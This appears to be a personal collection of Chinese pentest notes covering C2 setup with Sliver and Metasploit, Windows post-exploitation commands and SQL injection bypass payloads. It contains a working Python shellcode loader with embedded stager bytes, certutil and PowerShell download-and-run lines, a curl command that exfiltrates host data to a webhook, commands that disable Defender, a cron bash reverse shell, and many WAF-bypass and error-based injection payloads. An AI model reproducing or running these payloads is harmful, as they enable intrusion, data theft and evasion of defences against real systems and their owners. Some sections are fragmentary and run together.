item.title: gitlab判断版本
item.description: 版本判断hash查找 http://url/assets/webpack/manifest.json hash对比 https://github.com/righel/gitlab-version-nse/blob/main/gitlab_hashes.json

item.title: arsenal
item.description: 命令行备忘录https://github.com/Orange-Cyberdefense/arsenal 添加自定义md路径在arsenal/modules/config.py中 CHEATS_PATHS = [ #join(DATAPATH, "cheats"), # DEFAULT join(DATAPATH, "/home/administrator/workspace/test/arsenal-md"), ] 一个md示例，命令行上面一行的标签和备注差不多，可要可不要，threads默认值为10# Dirsearch ## Dirsearch php #plateform/multiple #target/remote #cat/dir_brute \``` dirsearch.py -e php -u <url> \``` ## Dirsearch no 404 #plateform/multiple #target/remote #cat/dir/brute \``` dirsearch.py -e php -u <url> -t <threads> -x 404 \``` = threads: 10

item.title: tun2socks
item.description: # 用这个工具是因为proxychains的代理原理不一样，代理不了某些工具的流量 ./tun2socks-linux-amd64 -device tun://tun-goad -proxy socks5://127.0.0.1:1080 ip link set tun-goad up ip route add 192.168.56.0/24 dev tun-goad

item.title: sliver
item.description: # 安装msf是为了用于后续生成python的shellcode等功能 proxychains4 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \ chmod 755 msfinstall && \ sudo proxychains4 ./msfinstall && \ proxychains4 curl https://sliver.sh/install > sliverinstall && \ chmod 755 sliverinstall && \ sudo proxychains4 ./sliverinstall https://github.com/BishopFox/sliver/wiki/Compile-From-Source # sliver-server服务端生成客户端配置文件 sudo /root/sliver-server operator --name admin --lhost 192.168.1.12 --lport 45678 --save admin.cfg # 后台以守护进程方式运行sliver-server在45678端口 nohup /root/sliver-server daemon --lport 45678 & # sliver-client客户端导入配置文件 sliver-client import admin.cfg # 连接silver服务端 sliver-client # 创建stager配置文件 profiles new --http 192.168.1.12:8848 --skip-symbols --format shellcode --arch amd64 win64stage # 开启监听 http -l 8848 # 创建分阶段监听器 stage-listener --url tcp://192.168.1.12:80 --profile win64stage # 创建Stager generate stager --lhost 192.168.1.12 --lport 80 --arch amd64 --format py 将上面命令执行后生成的shellcode拷贝到python 64位shellcode加载器，用pyinstaller打包即可，暂时不考虑打包大小import ctypes # shellcode buf = b"" buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51" buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52" buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72" buf += b"\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0" buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41" buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b" buf += b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f" buf += b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48" buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b" buf += b"\x40\x20\x49\x01\xd0\x50\xe3\x56\x4d\x31\xc9\x48" buf += b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0" buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1" buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44" buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58" buf += b"\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59" buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" buf += b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49" buf += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49" buf += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5" buf += b"\x49\xbc\x02\x00\x27\x0f\xc0\xa8\x01\x0c\x41\x54" buf += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07" buf += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41" buf += b"\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50" buf += b"\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89" buf += b"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf" buf += b"\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89" buf += b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5" buf += b"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00" buf += b"\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9" buf += b"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8" buf += b"\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20" buf += b"\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00" buf += b"\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4" buf += b"\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31" buf += b"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba" buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58" buf += b"\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00" buf += b"\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41" buf += b"\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c" buf += b"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6" buf += b"\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d" buf += b"\x2a\x0a\x41\x89\xda\xff\xd5" shellcode = buf shellcode = bytearray(shellcode) # 设置VirtualAlloc返回类型为ctypes.c_uint64 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 # 申请内存 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) # 放入shellcode buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)) ) # 创建一个线程从shellcode放置位置首地址开始执行 handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) # 等待上面创建的线程运行完 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) # 创建stager配置文件 profiles new beacon --http 192.168.1.12:8858 --skip-symbols --format shellcode --arch amd64 win64beacon # 开启监听 http -l 8858 # 创建分阶段监听器 stage-listener --url tcp://192.168.1.12:90 --profile win64beacon # 创建Stager generate stager --lhost 192.168.1.12 --lport 90 --arch amd64 --format py # tcp # 先进入已控session pivot tcp -b 10.0.0.1 -l 8989 # 生成 generate --tcp-pivot 10.0.0.1:8989 -s ./tmp/pivot.exe # smb # 先进入已控session named-pipe -a -b bbbaaa # 生成 generate --named-pipe 10.0.0.1/pipe/bbbaaa -s ./tmp/pivot.exe execute-assembly nxc.exe -h sideload nxc.exe -h

item.title: nmap
item.description: 使用ping扫描探测存活主机，不进行端口扫描# 老版是 -sP 参数 nmap -sn 10.0.0.0/24 使用arp扫描探测存活主机，内网推荐nmap -sn -PR 10.0.0.0/24 以一分钟不低于10000的发包率扫描全端口nmap --min-rate 10000 -p- 10.0.0.3 以一分钟不低于10000的发包率udp扫描全端口（结合上一个扫描进行对比，判断结果是否准确）nmap -sU --min-rate 10000 -p- 10.0.0.3 指定tcp扫描，获取端口服务信息（-sV），操作系统版（-O）本信息，指定端口时可以加入udp扫描出的端口nmap -sT -sV -O -p80,8080,9090 10.0.0.3 nmap --script=vuln -p80,8080,9090 10.0.0.3 # 跳过ping主机发现，直接端口扫描 nmap -P0 10.0.0.3 nmap -Pn 10.0.0.3 nmap --min-rate 10000 -p- -sT -sV 10.0.0.3 实际环境nmap -iL hosts.txt -Pn --min-rate 5000 --max-retries 1 --max-scan-delay 20ms -T4 --top-ports 1000 --exclude-ports 22,53 --open -oX nmap.xml

item.title: msf
item.description: proxychains4 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall chmod 755 msfinstall sudo proxychains4 ./msfinstall # 在https://apt.metasploit.com/最下面找到对应版本的msf的deb文件 dpkg -i metasploit-framework_6.3.39+20231019102707~1rapid7-1_amd64.deb msf6 > setg Proxies socks5:192.168.0.11:1080 Proxies => socks5:192.168.0.11:1080 msf6 > setg ReverseAllowProxy true ReverseAllowProxy => true //得到一个meterpreter后添加目标路由 meterpreter > run autoroute -s 10.10.10.0 //查看session中的路由 meterpreter > run autoroute -p //搭建代理在本地192.168.0.12 msf6 > use auxiliary/server/socks_proxy msf6 auxiliary(server/socks_proxy) > set srvhost 192.168.0.12 msf6 auxiliary(server/socks_proxy) > run

item.title: mitmproxy
item.description: pip install mitmproxy 插件启动mitmdump -p 9090 -s websockets-update.py websockets-update.pyfrom mitmproxy import http def websocket_message(flow: http.HTTPFlow): assert flow.websocket is not None # make type checker happy last_message = flow.websocket.messages[-1] if last_message.from_client: # get rep data print("client init message: "+str(last_message.content,'utf-8')) # update messagecontent,or you can update other value with replace '{"auth_user":"123","auth_pass":"123"}' messagecontent = b'{"auth_user":"123","auth_pass":"123"}' last_message.content = messagecontent print("after client update : "+str(messagecontent,'utf-8')) else: # get resp data print("server init message: "+str(last_message.content,'utf-8')) # update messagecontent,or you can update other value with replace 'fuckwebsocksts' messagecontent = str(last_message.content,'utf-8')+":::\n"+"fuckwebsocksts" print("after server update: "+messagecontent)

item.title: burpsuite
item.description: 先加载备份文件夹my-burp-plugin/python-scripter中的python-scripter.py或者直接在burp插件商店装载，然后再python-scripter标签中加载update-http-req-resp.py内容即可。python-scripter.py地址https://github.com/portswigger/python-scripterupdate-http-req-resp.py# get header value def get_header_value(header_name, headers): for header in headers: if header.lower().startswith(header_name.lower()): return header.split(":")[1] return None # update header value def update_headers_value(header_name, header_newvalue, headers): for header in headers: if header.lower().startswith(header_name.lower()): headers.remove(header) header = header_name+": "+header_newvalue headers.add(header) return header return None # handle req and resp if messageIsRequest: # get req data req = messageInfo.getRequest() req_data = helpers.analyzeRequest(req) headers = req_data.getHeaders() body = req[req_data.getBodyOffset():].tostring() # update param,to handle other param,please replece name 'test' for param in req_data.getParameters(): if param.getName() == 'test': # update value,or you can replace 'admin' with other value newParamValue = "admin" newParam = helpers.buildParameter(str(param.getName()),newParamValue,param.getType()) newReqParam = helpers.updateParameter(req,newParam) messageInfo.setRequest(newReqParam) # update header,to handle other header,please replece name 'User-Agent' and replace value 'fuckagent' req = messageInfo.getRequest() req_data = helpers.analyzeRequest(req) headers = req_data.getHeaders() update_headers_value('User-Agent','fuckagent',headers) body = req[req_data.getBodyOffset():].tostring() newReq = helpers.buildHttpMessage(headers,body) messageInfo.setRequest(newReq) # messageInfo.setRequest(newHeader) else: # get resp data resp = messageInfo.getResponse() resp_data = helpers.analyzeResponse(resp) headers = resp_data.getHeaders() body = resp[resp_data.getBodyOffset():].tostring() # update response data,example header value and body value update_headers_value('Server','fuckserver',headers) newBody = body+"\n"+"what fuck" newResp = helpers.buildHttpMessage(headers,newBody) messageInfo.setResponse(newResp)

item.title: XSS
Windows
item.description: net user /domain net group "Enterprise Admins" /domain tasklist /svc net statistics workstation ipconfig /all tracert 10.0.0.3 wmic os get name wmic os get caption,buildnumber //delims以!作为分隔符，防止空格 for /f "delims=!" %i in ('dir /s /b c:adminadmin.txt') do echo %i > %i/../path.txt //写入2.txt del 2.txt && echo PD9waHAgcGhwaW5mbygpOz8+ > 1.txt && certutil -decode 1.txt 2.txt && del 1.txt powershell -w hidden -c "'PD9waHAgcGhwaW5mbygpOz8+' | ForEach-Object { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_)) } | Set-Content -Path 'c:\temp\a.txt'" //无回显命令执行 wmic process call create "cmd.exe /c whoami > c:\temp\aaa.txt" //执行木马 wmic process call create "c:\temp\shell.exe" //通过进程名停止 wmic process where name="explorer.exe" call terminate taskkill /f /im cmd.exe //通过进程id停止 taskkill /f /pid 1234 for /l %i in (1,1,254) do @ping -w 1 -n 1 10.10.10.%i | findstr "TTL=" > aa.txt powershell $fileContent = "123456";$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent);$encodedCommand = [Convert]::ToBase64String($bytes);$encodedCommand powershell $filePath = "c:\path\file.txt";$fileContent = Get-Content -Path $filePath;$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent);$encodedCommand = [Convert]::ToBase64String($bytes);$encodedCommand //编码aaa.txt，结果保存到bbb.txt powershell $fileContent = Get-Content -Path "aa.txt" -Encoding Byte;$hexEncodedContent = $fileContent | ForEach-Object { $_.ToString("X2") };$hexEncodedContent | Out-File -FilePath "bbb.txt" -NoNewline certutil -urlcache -split -f http://192.168.1.11/aa.txt aa.exe //查看缓存 certutil.exe -urlcache * //删除所有缓存 certutil.exe -urlcache * delete //删除指定缓存 certutil -urlcache -split -f http://192.168.1.11/aa.txt delete powershell -w hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.1.11/aa.txt','aa.exe') wmic process list brief net user testuser /domain //能看出是域环境还是工作组 net config workstation net group "Domain Controllers" /domain nslookup test.com nslookup -type=SRV _ldap._tcp.test.com net start wmic service where (state="running") get caption, name, startmode net group "domain computers" /domain wmic computersystem get name copy 1.jpg/b+1.php/a 2.jpg # 全盘查找文件，一定要加一个星号 for /r c:\ %i in (password.txt*) do @echo %i for /r c:\ %i in (*.ini) do @echo %i # 查找 C 盘中包含 password 字样的文件，一定要双引号 findstr /s /n "password" c:\* # 查找 pwd.txt 中是否包含 password 字样，一定要双引号 find /N /I "password" pwd.txt Get-WmiObject Win32_ComputerSystem | select -ExpandProperty Domain wmic datafile where "drive='d:' and FileName='123qwe' and Extension='txt'" get name cmd /c forfiles /p d:\ /s /m 123qwe.txt /c "cmd /c echo @path>456.txt" @^p^o^w^e^r^shell c:**32\c*?c.e?e # calc powershell C:**2\n??e*d.*? # notepad //排除png和jpg, 密码12345 7za.exe a new.7z C:\Users\admin\Desktop\new -r -p12345 -x!*.png -x!*.jpg ipconfig >D:\111.txt && curl -F data=@D:\111.txt https://webhook.site/062ed8c9-31db-4a54-a662-61d88f6c92a6 && del D:\111.txt powershell Set-MpPreference -DisableRealtimeMonitoring $true powershell Set-MpPreference -DisableBehaviorMonitoring $true

item.title: SQL注入绕过
item.description: # 编码绕过 %20, %09, %0a, %0b, %0c, %0d, %a0, %1e, %C2%85, %C2%A0 # 括号 union(select(userpwd)from(adminuser)) # 其他 --%0a, --随机字符串%0a and ord(0x1) --> and True and ord(0x0) --> and False %26%26%201=1 --> && 1=1 --> and 1=1 likeselect user() like 'roo%' select password from users where password like '%123456%' 其他>、<、not in # 通过hash判断的登录逻辑伪代码 select pass_hash where username = '.$_POST["login_name"].'; if(pass_hash = $_POST['pass_hash']) { success; } /** 提交username为admin' union select abcd' -- aa，提交的password为abcd，此时sql语句为select pass_hash where username = 'admin' union select abcd' -- aa '，而pass_hash和我们提交的$_POST['pass_hash']一致，从而绕过了登录逻辑 **/ /*!30000order*//*!30000by*/ 1 /*!40000/*!30000order*//*!40000/*!30000by*/ 1 ?id=1&id=2&id=3 union select user() -- aa # ODBC才会有的写法。并不是标准的sql语法。 SELECT * FROM table1 WHERE datefield = {d '1995-09-12'} # ddd为table 1 union(select%0aall{x userpwd}from{x ddd}) 1 union(select%0adistinct{x userpwd}from{x ddd}) 1 union(select%0adistinctrow{x userpwd}from{x ddd}) 参考链接：在《WAF攻防之SQL注入篇》中几个有意思的发现 https://xz.aliyun.com/t/2069 payload： http://192.168.20.81/user.php?id=@a:=(select @b:=`table_name`from{a information_schema.`TABLES` }limit 0,1)union select '1',@a 1/*ddd*/union/*ddd*/select 1' union/*!50000select%0aall*/username from users%23 1' union/*!50000select%0adistinct*/username from users%23 1' union/*!50000select%0adistinctrow*/username from users%23 id=1\Nunion(select 1,schema_name,\Nfrom information_schema.schemata) union%%0aselect &asdasdas=1*/ 在请求中添加大量的垃圾数据干扰waf mult1=fhiowjaeojdwlgfjawgdiuawuyieaydbsjhgd&mult2=fhiowjaeojdwlgfjawgdiuawuyieaydbsjhgd&id=1 iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select iis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select +--------------------------------------------------------------------+ | Keywords | WAF | ASP/ASP.NET | +--------------------------------------------------------------------+ | sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. | | ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx | | <scr%ipt> | <scr%ipt> | <script> | | <if%rame> | <if%rame> | <iframe> | +--------------------------------------------------------------------+ mysql_real_escape_string示例代码逻辑 <?php $username = mysql_real_escape_string($_GET['username']); $password = mysql_real_escape_string($_GET['password']); $query = "SELECT username FROM users WHERE username='$username' AND password='$password' "; $res = mysql_query($query, $database); if($res) { if(mysql_num_rows($res) > 0){ $row = mysql_fetch_assoc($res); return $row['username']; } } return Null; 该逻辑存在任意用户身份进行登录 # 在处理SQL中的字符串时，字符串末尾的空格字符都会被删除。换句话说，“vampire”与“vampire ”几乎是等效的，这在大多数情况下是正确的，例如WHERE子句中的字符串或INSERT语句中的字符串 例如，以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。 SELECT * FROM users WHERE username='vampire ' # 假设一个易受攻击的网站使用了前面提到的PHP代码来处理用户的注册和登录。为了入侵任意用户的帐户(就本例来说，用户名为“vampire”)，只需使用用户名“vampire[一些空白字符]1”和一个随机密码进行注册即可。对于选择的用户名，前25个字符应该只包含vampire和空白字符。这样做的好处是，将有助于绕过检查特定用户名是否已存在的查询。在执行SELECT查询语句时，SQL是不会将字符串缩短为25个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当运行INSERT查询语句时，它只会插入前25个字符。 SELECT * FROM users WHERE username='vampire 1'; INSERT INTO users(username, password) VALUES ('vampire 1', 'random_pass'); # 参考链接：https://xz.aliyun.com/t/1269，这个攻击已经在MySQL和SQLite上成功通过测试。相信同样适用于其他数据库下 # make_set select updatexml(1,make_set(3,'~',(select user())),1); # lpad select updatexml(1,lpad('@',30,(select user())),1); # repeat select updatexml(1,repeat((select user()),2),1); # reverse select updatexml(1,reverse((select user())),1); # export_set select updatexml(1,export_set(1|2,'::',(select user())),1); # 参考：updatexml injection without concat # https://xz.aliyun.com/t/2160 # locate select * from test where test=1 and locate('ro', substring(user(),1,2))>0; # position select * from test where test=1 and position('ro' IN substring(user(),1,2)); # instr select * from test where test=1 and instr(substring(user(),1,2), 'ro')>0; # 参考：mysql 过滤like时的另类盲注方法 # https://xz.aliyun.com/t/4736 <?php if(preg_match('/UNION.+?SELECT/is', $input)) { die('SQL Injection'); } # bypass: UNION/aa..100w个a..aaa/SELECT # 参考：利用正则回溯最大次数上限绕过preg_match # https://xz.aliyun.com/t/10219 # https://forum.butian.net/share/1979 # 让waf忽略#号后面的内容 id=-13 like "[%23]" /*!10444union%0aselect*/1,database(/*!10444*/),3,4,5,6,7,8,9,10 --+ ?id=1') union select 1,2,3-- aa # 在1后面加上%00 并 url 编码,原理是 waf 把空字节认为是结束导致了后面的语可以绕过 ?id=1%23emoji表情包%0aunion%23emoji表情包%0aselect%23emoji表情包%0a1,2,3 # 又记一次安服仔薅洞实战-未授权之发现postgresql注入 https://forum.butian.net/share/1344 # 符号||是用来拼接字符串，意思就是在PDSQL中，一个Select语句可以同时执行多个语句，to_date函数是用来出错的，substring(current_database)通过将数据库名字拆成一个个字符，然后与后面的qwe进行比较，如果出错就会报出数据库的名字，通过修改from后面的数字可以修改数据库的第几位字符，这样就把数据库名字给注入出来了 '||(to_date(substring(current_database()from 1 for 1),'qwe'))||'

infodbsize info keyspace keys *mget key1 key2config get databasesselect 1 select 2 set 1 '

*/1 * * * * bash -i >& /dev/tcp/X.X.X.X/7789 0>&1

item.title: Python
item.description:
python -m http.server 9090 在cmd执行Python连接webshell，来命令执行时，如果目录有空格，可以用双引号拼接的方式，比如python exec.py "dir ""c:/space directory" import random,sys # 异或运算 def do_xor(str_a,str_b): return (f'("{str_a}"^"{str_b}")',chr(ord(str_a) ^ ord(str_b))) # 获取异或结果，保存到列表 def get_xorRes(myStr): elems = "" for i in range(32, 127): elems += chr(i) xorRes_list = [] for i in elems: for j in elems: xorRes = do_xor(i,j) if xorRes[1] in myStr: xorRes_list.append(xorRes[0] + "==>>" + xorRes[1]) return xorRes_list # 将列表中的多个异或结果保存到字典 def getRes(myStr): xorRes_list = get_xorRes(myStr) res = {} for i in range(0,len(myStr)): res[i] = [] for j in xorRes_list: if j[-1] == myStr[i]: res[i].append(j) return res # 从字典的元素列表中随机选取一个 def choiceRes(myStr): res = getRes(myStr) xorspel = [] for k in res: choice_v = random.choice(res[k]) xorspel.append(choice_v) return xorspel if __name__ == "__main__": if len(sys.argv) > 1: myStr = sys.argv[1] xorspel = choiceRes(myStr) for i in xorspel:print(i) else: print("Usage: python3 xorForStr.py assert") urllist = [] with open(filename,"r") as fr: urls = fr.readlines() for url in urls: url = url.strip("
").strip("") urllist.append(url) try: # 覆盖写把 a+ 换成 w with open(filename,"a+") as fw: fw.write('123456') except: pass from concurrent.futures import ThreadPoolExecutor, wait def run(loginid,password): print("use function") print(str(loginid) + " | " + str(password)) if __name__ == "__main__": # thread thread_list= [] # max thread = 20 with ThreadPoolExecutor(max_workers=20) as executor: for loginid in range(1,100): for password in range(100,200): thread_list.append(executor.submit(run,loginid,password)) wait(thread_list) print("end...") import requests,json url = '' result = requests.get(url=url) json_result = json.loads(result.text).get('ziduan1').get('下级ziduan2') print(json_result) from hashlib import md5 password = '' pass_md5 = md5(password.encode('utf-8')).hexdigest() print(pass_md5) result = [1,2,2,3,4,5,4] return list(set(result)) from fake_useragent import UserAgent ua=UserAgent() headers={"User-Agent":ua.random} print(headers) import requests with open("aa.php","rb") as fr: content = fr.read() proxies = { 'http':"http://127.0.0.1:8080", 'https':"http://127.0.0.1:8080" } file = {'file': ("aa.php",content)} url = 'http://www.google.com' res = requests.post(url, files=file,proxies=proxies) # 如果涉及到了参数的传递时，其实就要用到requests的两个参数：data、files，将要上传的文件传入files，将其他参数传入data，request库会将两者合并到一起做一个multi part，然后发送给服务器。 import os root_path = 'C:\Users\PASSWORD\Desktop\temp' def get_path(root_path): file_name = [] for filepath,dirnames,filenames in os.walk(root_path): for filename in filenames: file_name.append(os.path.join(filepath,filename)) return file_name path = get_path(root_path) for i in path:print(i) # filepath表示当前正在访问的文件夹路径 # dirnames表示该文件夹下的所有子目录名 # filenames表示该文件夹下的所有文件 import sys if len(sys.argv) > 1: print(sys.argv[1]) else: print("Usage: python file_name.py <string_to_print>") pip install pyinstaller # -F 打包成独立exe -w 去掉cmd命令行显示，-i 指定ico图标 pyinstaller -F -w ss.py # 先生成证书 # openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365 from flask import Flask app = Flask(__name__) @app.route('/aa',methods=['GET','POST']) def root(): return "OK" if __name__ == "__main__": app.run(ssl_context=('cert.pem', 'key.pem'), debug=True, host="0.0.0.0", port=8443) import subprocess def subprocess_popen(statement): p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE) # 执行shell语句并定义输出格式 while p.poll() is None: # 判断进程是否结束（Popen.poll()用于检查子进程（命令）是否已经执行结束，没结束返回None，结束后返回状态码） if p.wait() != 0: # 判断是否执行成功（Popen.wait()等待子进程结束，并返回状态码；如果设置并且在timeout指定的秒数之后进程还没有结束，将会抛出一个TimeoutExpired异常。） print("命令执行失败") return False else: re = p.stdout.readlines() # 获取原始执行结果 result = [] for i in range(len(re)): # 由于原始结果需要转换编码，所以循环转为utf8编码并且去除
换行 res = re[i].decode('utf-8').strip('
') result.append(res) return result print(subprocess_popen('whoami')) # 将参数设置为字符串，加上对应的content-type即可 data="""a=1!@&b=2""" requests.post(data) pip3 install pycryptodome https://zhuanlan.zhihu.com/p/471661231 打开 Home - Visual Studio Subscriptions Portal，登录账号，点击进入下载页面 在下载页面搜索build tools，找到左侧的Visual Studio 2015 update 3 点击Visual Studio 2015 update 3后，下载对应的文件即可，约1.1G，这里需要将格式修改为DVD 下载完成后，我们得到了文件mu_visual_cpp_build_tools_2015_update_3_x64_dvd_dfd9a39c.iso，解压后，双击VisualCppBuildTools_Full.exe即可自动进行安装 # 只返回一个，返回的是一个Match对象 import re text = "adw1856-7568593fe iuhuiui72209adhkjkj,!#@^#&#*&AadhdhuiJAYWGy873iuaui2hiq1856-7934568" print(re.search(r'(\d{4})-(\d{7})',text)) print(re.search(r'(\d{4})-(\d{7})',text).group(1)) # 取值

item.title: PHP
item.description:
php -S 0.0.0.0:9090 包含Session文件 包含日志文件 包含SSH log 包含environ 包含临时文件 00字符截断（PHP版本<=5.3.4） 路径长度截断（php版本小于5.3.10） 目录穿越 URL绕过（?、#） WebDav文件包含 SMB Bypass 魔术方法 session phar php版本 >= 5.2，phar.readonly = off，文件操作函数的参数可控。 影响函数
include一个图片或日志文件 放入已经存在的文件

item.title: Oracle
item.description: select * from all_tables where rownum > 0 and rownum <6 -- 获取第一条数据 select table_name from all_tables fetch first 1 row only select table_name from all_tables fetch next 1 rows only -- 获取前条数据 select table_name from all_tables fetch first 5 rows only -- 获取第5-10条数据 select table_name from all_tables offset 4 rows fetch next 5 rows only select stragg(table_name||'~') from all_tables

item.title: Mysql
item.description: mysql连接可控，且允许load local data infile 利用工具地址 https://github.com/rmb122/rogue_mysql_server SELECT group_concat(schema_name) FROM information_schema.schemata select user() # 有时候数据库用户这样写：xxxx@localhost，有时候这样写:xxxx@%，有啥区别。当是“%”的时候，说明任意地址都能对数据库操作，于是我们在外部就能连接别人的数据库 select group_concat(table_name) from information_schema.tables where table_schema=database() select group_concat(column_name) from information_schema.columns where table_name='abc' # 假设users表有5列，查第3列 select `3` from (select 1,2,3,4,5 union select * from users limit 1,1) # 16进制 select 列名16进制 from users; # 判断数据库长度 select * from users where username=nouser or length(database())>8 # 判断数据库第1位字符的ascii码值 select * from users where username=nouser or ascii(substr(database(),1,1))<130 # sleep() select * from users where username=$username and if(length(database())>8,sleep(3),1) # BENCHMARK()，结果正确的时候，运行ENCODE('MSG','by 5 seconds')操作50000000次，会占用一段时间 select * from users where username=$username and if(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)) # 5.5<mysql版本<5.6 exp(~(select * from(select user())a)) # 输出字符长度限制为32个字符 and updatexml(1,concat(0x7e,(select user()),0x7e),1) and (extractvalue(1,concat(0x7e,(select user()),0x7e))) # floor select * from users where id=1 and (select * from (select count(*),concat(0x7e, (select schema_name from information_schema.schemata limit 1,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y); union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) -- 如果关键的表被禁用了可以使用这种形式，本地没成功 select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2) -- 如果rand被禁用了可以使用用户变量来报错 # 仅可取数据库版本信息 and exists(select * from (select * from(select name_const(version(),0)) a join (select name_const(version(),0)) b)c) # 5.5<mysql版本<5.6 and geometrycollection((select * from(select * from (version())a)b)) and polygon((select * from(select * from(version())a)b)) and multipoint((select * from(select * from(version())a)b)) and multlinestring((select * from (version())a)b)) and linestring((select * from(select * from(version())a)b)) and multipolygon((select * from(select * from(select user())a)b)) # join爆第一列，第二列，第三列名 select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b)c; select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b using(table_catalog))c; select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b using(table_catalog,table_schema))c; # bigint边界数值进行数值运算 select !(select * from(select user())a)-~0; # mysql 8.0.x SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1)); SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1)); # gtid select gtid_subset(user(),1); select gtid_subset(hex(substr(user(),1,200)),1); select gtid_subtract((select * from(select user())a),1); 报错注入拼接字符时返回正常页面的问题问题：有时使用xpath报错拼接字符串时会返回正常页面 原因： 从原理出发，可能是使用concat拼接时有数据为null，导致整个拼接字符为null,这又符合xpath_string语法，所以页面正常，只是xpath没匹配到结果 解决： 使用concat_ws替代，忽略所有null值 语法实例：concat_ws(';',user,pass,tel) # @@secure_file_priv 变量不为null select load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\xxxx')) # 为什么Windows可用，Linux不行？ # 这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以`\\`开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个`\\\\`中的两个`\`是用来进行转义处理的。 